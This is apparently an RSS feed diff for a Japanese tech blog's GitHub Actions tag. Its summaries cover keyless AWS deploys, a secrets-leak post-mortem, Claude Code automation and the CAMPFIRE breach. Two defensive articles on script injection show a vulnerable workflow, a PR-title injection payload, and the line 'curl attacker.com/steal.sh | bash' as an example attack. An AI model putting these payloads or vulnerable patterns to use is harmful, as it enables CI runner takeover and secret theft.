@@ -1,0 +1,163 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Github-Actions on hdknr blog</title><link>https://hdknr.github.io/blogs/tags/github-actions/</link><description>Recent content in Github-Actions on hdknr blog</description><generator>Hugo -- 0.161.1</generator><language>ja</language><lastBuildDate>Thu, 18 Jun 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://hdknr.github.io/blogs/tags/github-actions/index.xml" rel="self" type="application/rss+xml"/><item><title>キーを持たずに AWS へデプロイし、夜間に自動適用する — GitHub Actions 運用設計ノート</title><link>https://hdknr.github.io/blogs/posts/2026/06/keyless-aws-deploy-github-actions-oidc-nightly/</link><pubDate>Thu, 18 Jun 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/06/keyless-aws-deploy-github-actions-oidc-nightly/</guid><description>GitHub Actions から AWS へ OIDC でキーレスデプロイし、夜間 cron で安全に tofu apply する運用設計。鶏と卵問題・PR plan レビュー・冪等性まで実践的に解説。</description></item><item><title>SOPS復号後の secrets を GitHub Actions ログに平文露出した話 — masking バグの根本原因と4層防御の post-mortem</title><link>https://hdknr.github.io/blogs/posts/2026/05/sops-github-actions-secrets-leak-postmortem/</link><pubDate>Thu, 21 May 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/05/sops-github-actions-secrets-leak-postmortem/</guid><description>SOPS で暗号化した secrets を GitHub Actions ログに平文露出した実インシデントの post-mortem。::add-mask:: 登録ループが存在しない一時ファイルを参照していたバグの根本原因、即時対応 (run 削除 + rotate)、source-from-file パターン + workflow lint による4層防御まで詳説。</description></item><item><title>GitHub Actions self-hosted runner で Obsidian Vault 書き戻しを完成させる — claude -p をローカル文脈で動かす</title><link>https://hdknr.github.io/blogs/posts/2026/05/self-hosted-runner-vault-writeback/</link><pubDate>Mon, 18 May 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/05/self-hosted-runner-vault-writeback/</guid><description>PR マージのイベント駆動で Obsidian Vault に書き戻す処理を、self-hosted runner で手元の Mac に降ろす設計。cloud-hosted Actions の弱点（Vault に書けない・skills が使えない・会話文脈ゼロ）を一気に解消し、claude -p で Vault 直書きを実現する具体的な workflow と launchd セットアップを解説。</description></item><item><title>Obsidian Vault 書き戻しの自動化 — Claude Code hooks と Git フックと GitHub Actions の使い分け</title><link>https://hdknr.github.io/blogs/posts/2026/05/claude-code-vault-writeback-automation/</link><pubDate>Mon, 18 May 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/05/claude-code-vault-writeback-automation/</guid><description>個人 Obsidian Vault への書き戻し（writeback）を自動化する3つの方式を比較。Claude Code の hooks（PostToolUse / Stop / SessionEnd）、Git クライアントフック（post-merge）、GitHub Actions それぞれが拾えるトリガと文脈の違いを示し、推奨は『フックは器を用意し、AI が中身を書く』分業。</description></item><item><title>Claude Code で株式投資を自動化する — Alpaca API + 期待値計算で3週間4.19%の実績</title><link>https://hdknr.github.io/blogs/posts/2026/04/claude-code-stock-trading-automation/</link><pubDate>Mon, 27 Apr 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/04/claude-code-stock-trading-automation/</guid><description>Claude Code と Alpaca API を組み合わせた米国株自動売買システムの構築方法を解説。期待値計算ベースのルールで損切り・利確を自動化し、3週間で月次リターン4.19%を達成した実装例を紹介。</description></item><item><title>CAMPFIRE 個人情報漏洩から学ぶ — GitHub アカウント侵害が招く CI/CD セキュリティリスク</title><link>https://hdknr.github.io/blogs/posts/2026/04/campfire-github-cd-security/</link><pubDate>Sat, 25 Apr 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/04/campfire-github-cd-security/</guid><description>&lt;p&gt;クラウドファンディングプラットフォーム CAMPFIRE が、GitHub アカウントへの不正アクセスを起点に最大 22 万 5,846 件の個人情報が漏洩した可能性があると発表しました（2026 年 4 月 24 日）。単なる「パスワード流出」ではなく、&lt;strong&gt;CD パイプラインを悪用してインフラを乗っ取るという、現代の DevOps が抱えるリスクを象徴するインシデント&lt;/strong&gt;です。本記事ではエンジニア視点で攻撃経路を分析し、再発防止策を考えます。&lt;/p&gt;
+&lt;h2 id="インシデントの経緯"&gt;インシデントの経緯&lt;/h2&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;日時&lt;/th&gt;
+&lt;th&gt;出来事&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;2026-04-02 22:50&lt;/td&gt;
+&lt;td&gt;GitHub アカウントへの不正アクセスを検知。一部ソースコードが閲覧された可能性（初報）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;2026-04-14&lt;/td&gt;
+&lt;td&gt;第二報：社員・取引先情報の閲覧可能状態を確認&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;2026-04-22&lt;/td&gt;
+&lt;td&gt;第三報：顧客情報管理システムへの不正アクセス痕跡を確認&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td&gt;2026-04-24&lt;/td&gt;
+&lt;td&gt;個人情報漏洩の可能性を正式発表（最大 22 万 5,846 件）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;漏洩した可能性がある情報は以下のとおりです:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;プロジェクト実行者&lt;/strong&gt; 12 万 929 件：氏名・住所・電話番号・口座情報など（2021 年 2 月以降）&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;支援者&lt;/strong&gt; 13 万 155 件：氏名・住所・口座情報など（PayPal 決済、後払い、口座送金返金ユーザー）&lt;/li&gt;
+&lt;li&gt;うち &lt;strong&gt;8 万 2,465 件&lt;/strong&gt;が口座情報を含む&lt;/li&gt;
+&lt;li&gt;クレジットカード情報は対象外（CAMPFIRE 公式発表）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id="推定される攻撃経路"&gt;推定される攻撃経路&lt;/h2&gt;
+&lt;p&gt;エンジニア向け技術解説として、@poly_soft（勝又健太）氏が X（旧 Twitter）で以下の攻撃チェーンを推察しています。この分析は公式発表を補完する形で、攻撃者が具体的にどう動いたかを示しています（以下はあくまで推定です）。&lt;/p&gt;
+&lt;h3 id="step-1-cd-権限を持つ-github-アカウントの侵害推定"&gt;Step 1: CD 権限を持つ GitHub アカウントの侵害（推定）&lt;/h3&gt;
+&lt;p&gt;攻撃者が最初に侵害したのは、&lt;strong&gt;単独で CD（継続的デプロイ）をトリガーできる権限を持つ GitHub アカウント&lt;/strong&gt;であったと推定されます。&lt;/p&gt;
+&lt;p&gt;問題の設定として考えられるのは:&lt;/p&gt;</description></item><item><title>GitHub Actions スクリプトインジェクション対策</title><link>https://hdknr.github.io/blogs/wiki/guides/github-actions-security/</link><pubDate>Mon, 06 Apr 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/wiki/guides/github-actions-security/</guid><description>GitHub Actions で ${{ }} テンプレート式の不適切な使用による攻撃を防ぐガイド</description></item><item><title>Claude Code + Self-hosted Runner: 「Auto mode is unavailable for your plan」エラーの原因と対処</title><link>https://hdknr.github.io/blogs/posts/2026/03/claude-code-self-hosted-runner-auto-mode/</link><pubDate>Tue, 31 Mar 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/03/claude-code-self-hosted-runner-auto-mode/</guid><description>&lt;h2 id="症状"&gt;症状&lt;/h2&gt;
+&lt;p&gt;GitHub Actions の self-hosted runner で &lt;code&gt;claude --print&lt;/code&gt; を使った自動処理が突然動かなくなった。&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;claude CLI failed (rc=1): stdout=Auto mode is unavailable for your plan
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;すべてのエージェント呼び出し（researcher, risk, portfolio optimizer）が同じエラーで失敗し、日次の投資提案が生成されなくなった。&lt;/p&gt;
+&lt;p&gt;ローカルで &lt;code&gt;claude --print &amp;quot;hello&amp;quot;&lt;/code&gt; を実行すると正常に動作する。&lt;code&gt;claude auth status&lt;/code&gt; でも Max プランで認証済みと表示される。&lt;/p&gt;
+&lt;h2 id="原因"&gt;原因&lt;/h2&gt;
+&lt;p&gt;2つの問題が重なっていた。&lt;/p&gt;
+&lt;h3 id="1-oauth-トークンの期限切れ副次的問題"&gt;1. OAuth トークンの期限切れ（副次的問題）&lt;/h3&gt;
+&lt;p&gt;ワークフローで &lt;code&gt;CLAUDE_CODE_OAUTH_TOKEN&lt;/code&gt; 環境変数に &lt;strong&gt;期限切れの OAuth トークン&lt;/strong&gt; を GitHub Secrets から渡していた。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;"&gt;&lt;tr&gt;&lt;td style="vertical-align:top;padding:0;margin:0;border:0;"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;2
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;3
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-yaml" data-lang="yaml"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# daily-proposal.yml&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;- &lt;span style="color:#f92672"&gt;name&lt;/span&gt;: &lt;span style="color:#ae81ff"&gt;日次投資提案を生成&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;env&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;CLAUDE_CODE_OAUTH_TOKEN&lt;/span&gt;: &lt;span style="color:#ae81ff"&gt;${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }} &lt;/span&gt; &lt;span style="color:#75715e"&gt;# ← 2月に設定したまま&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;GitHub Secrets のトークンは静的で自動更新されない&lt;/li&gt;
+&lt;li&gt;ローカルでは環境変数未設定のため、キーチェーンから有効なトークンが自動取得されて動作していた&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="2-opus-の-auto-mode-制限真の原因"&gt;2. Opus の auto mode 制限（真の原因）&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;claude --print&lt;/code&gt; はデフォルトで &lt;strong&gt;auto mode&lt;/strong&gt;（ツール自動承認）で動作する。Max プランで &lt;strong&gt;Opus モデルの auto mode が制限された&lt;/strong&gt;ため、トークンが有効でも Opus では &lt;code&gt;--print&lt;/code&gt; が使えなくなっていた。&lt;/p&gt;</description></item><item><title>GitHub Actions スクリプトインジェクション完全解説 — ${{ }} を run に書いた瞬間、攻撃者にシェルを渡している</title><link>https://hdknr.github.io/blogs/posts/2026/03/1e29bea3f9f5cdf4a2b11eec4a2ab536/</link><pubDate>Fri, 06 Mar 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/03/1e29bea3f9f5cdf4a2b11eec4a2ab536/</guid><description>&lt;h1 id="github-actions-スクリプトインジェクション完全解説----を-run-に書いた瞬間攻撃者にシェルを渡している"&gt;GitHub Actions スクリプトインジェクション完全解説 — &lt;code&gt;${{ }}&lt;/code&gt; を &lt;code&gt;run&lt;/code&gt; に書いた瞬間、攻撃者にシェルを渡している&lt;/h1&gt;
+&lt;p&gt;&lt;a href="https://x.com/tmknom/status/2029512334218244121"&gt;『GitHub CI/CD実践ガイド』著者の tmknom 氏（@tmknom）&lt;/a&gt;が、GitHub Actions のスクリプトインジェクションを解説した Zenn 記事を引用し、こう呼びかけています。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;はい、というわけでしてね。みんな『GitHub CI/CD実践ガイド』を、穴が開くまで読んでくださいね！&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;引用されている &lt;a href="https://zenn.dev/kou_pg_0131/articles/gha-script-injection"&gt;kou_pg_0131 氏の Zenn 記事&lt;/a&gt;は、GitHub Actions の &lt;code&gt;run&lt;/code&gt; ステップで &lt;code&gt;${{ }}&lt;/code&gt; テンプレート式を使う際のインジェクション脆弱性を実演付きで解説した記事です。2025〜2026年にかけて GitHub Actions のサプライチェーン攻撃が急増しており、この知識はすべての開発者にとって必須になっています。&lt;/p&gt;
+&lt;h2 id="何が危険なのか--30秒で理解する"&gt;何が危険なのか — 30秒で理解する&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;"&gt;&lt;tr&gt;&lt;td style="vertical-align:top;padding:0;margin:0;border:0;"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-yaml" data-lang="yaml"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# 危険なコード&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;- &lt;span style="color:#f92672"&gt;run&lt;/span&gt;: &lt;span style="color:#ae81ff"&gt;echo &amp;#34;PR title is ${{ github.event.pull_request.title }}&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;一見無害なこのコード。しかし攻撃者が PR タイトルに以下を入力すると、&lt;strong&gt;任意のコマンドが実行&lt;/strong&gt;されます。&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;#34;; echo INJECTED&amp;#34;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;展開後のシェルコマンドは以下になります。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;"&gt;&lt;tr&gt;&lt;td style="vertical-align:top;padding:0;margin:0;border:0;"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;echo &lt;span style="color:#e6db74"&gt;&amp;#34;PR title is &amp;#34;&lt;/span&gt;; echo INJECTED&lt;span style="color:#e6db74"&gt;&amp;#34;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;セミコロンでコマンドが分割され、&lt;code&gt;echo INJECTED&lt;/code&gt; が実行されます。&lt;code&gt;echo&lt;/code&gt; の代わりに &lt;code&gt;curl attacker.com/steal.sh | bash&lt;/code&gt; を書けば、CI/CD ランナー上で&lt;strong&gt;リバースシェルの確立、シークレットの窃取、リポジトリの改ざん&lt;/strong&gt;が可能です。&lt;/p&gt;</description></item><item><title>GitHub Actionsスクリプトインジェクション完全解説 — ${{ }}をrunに書いた瞬間、攻撃が始まる</title><link>https://hdknr.github.io/blogs/posts/2026/03/5bbdc7bd98ff0dbdfde257d909d48d8c/</link><pubDate>Thu, 05 Mar 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/03/5bbdc7bd98ff0dbdfde257d909d48d8c/</guid><description>&lt;h1 id="github-actions-スクリプトインジェクション完全解説----を-run-に書いた瞬間攻撃が始まる"&gt;GitHub Actions スクリプトインジェクション完全解説 — &lt;code&gt;${{ }}&lt;/code&gt; を run に書いた瞬間、攻撃が始まる&lt;/h1&gt;
+&lt;p&gt;&lt;a href="https://x.com/koki_develop/status/2029339007013073368"&gt;@koki_develop 氏のポスト&lt;/a&gt;で紹介された Zenn 記事が話題になっています。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;書きました。GitHub Actions 触る人は全員知っておいてほしい&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;a href="https://zenn.dev/kou_pg_0131/articles/gha-script-injection"&gt;【GitHub Actions】スクリプトインジェクションの実践例&lt;/a&gt;（koki 氏）は、GitHub Actions ワークフローにおけるスクリプトインジェクションの仕組みを具体的なコード例で解説した記事です。「プライベートリポジトリなら大丈夫？」という疑問にも明確に「安全ではない」と回答しています。&lt;/p&gt;
+&lt;p&gt;2025 年には GhostAction キャンペーンで 3,325 件のシークレットが窃取され、tj-actions/changed-files のサプライチェーン攻撃では 23,000 以上のリポジトリが影響を受けました。スクリプトインジェクションは理論上の脅威ではなく、現在進行形のリスクです。&lt;/p&gt;
+&lt;h2 id="スクリプトインジェクションとは何か"&gt;スクリプトインジェクションとは何か&lt;/h2&gt;
+&lt;p&gt;GitHub Actions の &lt;code&gt;${{ }}&lt;/code&gt; 式は、&lt;strong&gt;シェルがコマンドを解析する前に&lt;/strong&gt;テンプレートエンジンによって展開されます。この順序が脆弱性の根本原因です。&lt;/p&gt;
+&lt;pre tabindex="0"&gt;&lt;code&gt;通常の期待:
+${{ github.event.pull_request.title }} → 文字列として処理される
+実際の動作:
+${{ github.event.pull_request.title }} → 値がそのままシェルスクリプトに埋め込まれる
+→ シェルがコマンドとして解釈する
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;つまり、PR タイトルやブランチ名など攻撃者が制御可能な値が、そのままシェルコマンドの一部になります。&lt;/p&gt;
+&lt;h2 id="攻撃の実践例"&gt;攻撃の実践例&lt;/h2&gt;
+&lt;h3 id="攻撃-1-pr-タイトルによるインジェクション"&gt;攻撃 1: PR タイトルによるインジェクション&lt;/h3&gt;
+&lt;p&gt;脆弱なワークフロー:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;"&gt;&lt;tr&gt;&lt;td style="vertical-align:top;padding:0;margin:0;border:0;"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;2
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;3
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;4
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;5
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;6
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;7
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;8
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-yaml" data-lang="yaml"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;on&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;pull_request&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;jobs&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;example&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;runs-on&lt;/span&gt;: &lt;span style="color:#ae81ff"&gt;ubuntu-latest&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#f92672"&gt;steps&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; - &lt;span style="color:#f92672"&gt;run&lt;/span&gt;: &lt;span style="color:#ae81ff"&gt;echo &amp;#34;PR title is ${{ github.event.pull_request.title }}&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;攻撃者が PR タイトルを &lt;code&gt;&amp;quot;; echo INJECTED&amp;quot;&lt;/code&gt; に設定すると:&lt;/p&gt;</description></item><item><title>GitHub Copilot CLI の /research コマンド --- コミットログも Actions 履歴も全部調べてくれるディープリサーチ</title><link>https://hdknr.github.io/blogs/posts/2026/03/db1fa7dce7e319be15057b655e03d099/</link><pubDate>Wed, 04 Mar 2026 00:00:00 +0000</pubDate><guid>https://hdknr.github.io/blogs/posts/2026/03/db1fa7dce7e319be15057b655e03d099/</guid><description>&lt;h1 id="github-copilot-cli-の-research-コマンド--コミットログも-actions-履歴も全部調べてくれるディープリサーチ"&gt;GitHub Copilot CLI の /research コマンド &amp;mdash; コミットログも Actions 履歴も全部調べてくれるディープリサーチ&lt;/h1&gt;
+&lt;p&gt;&lt;a href="https://x.com/07JP27/status/2028703509965939118"&gt;@07JP27 氏が X で連続投稿&lt;/a&gt;し、GitHub Copilot CLI の &lt;code&gt;/research&lt;/code&gt; コマンドの威力を紹介しています。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;/research コマンドすげえ。Web を Deep Research してくれるのはもちろん、紐づくリポジトリのコミットログとか GitHub Actions の実行履歴まで全部見てくれて「お前のこのときのコミットのここが原因だぞ。Actions のログにもこう出てるだろ」みたいなことを言ってくる。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;a href="https://x.com/07JP27/status/2028273762769281343"&gt;元の投稿&lt;/a&gt;では Qiita 記事（&lt;a href="https://qiita.com/shyamagu/items/4e2d30a24594c005a02f"&gt;@shyamagu 氏の解説&lt;/a&gt;）も参照されており、MCP ツール連携や WorkIQ との統合例が紹介されています。本記事では、&lt;code&gt;/research&lt;/code&gt; コマンドの技術的な仕組みと、Claude Code との比較を交えて解説します。&lt;/p&gt;
+&lt;h2 id="research-コマンドとは"&gt;/research コマンドとは&lt;/h2&gt;
+&lt;h3 id="概要"&gt;概要&lt;/h3&gt;
+&lt;p&gt;2026 年 2 月 25 日、GitHub Copilot CLI が全有料プラン向けに一般提供（GA）を開始しました。同日リリースの v0.0.417 で追加された &lt;code&gt;/research&lt;/code&gt; コマンドは、&lt;strong&gt;ディープリサーチ専用のスラッシュコマンド&lt;/strong&gt;です。&lt;/p&gt;
+&lt;p&gt;通常のチャットが速度重視なのに対し、&lt;code&gt;/research&lt;/code&gt; は&lt;strong&gt;徹底性（thoroughness）を重視&lt;/strong&gt;します。複数のツールを呼び出しながら情報を収集し、数百行に及ぶ Markdown レポートを生成します。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;div style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;"&gt;&lt;tr&gt;&lt;td style="vertical-align:top;padding:0;margin:0;border:0;"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;1
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;2
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;3
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;4
+&lt;/span&gt;&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%"&gt;
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# 基本的な使い方&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;/research Azure App Service の &lt;span style="color:#ae81ff"&gt;2026&lt;/span&gt; 年の新機能
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;# MCP ツールを明示的に指定&lt;/span&gt;
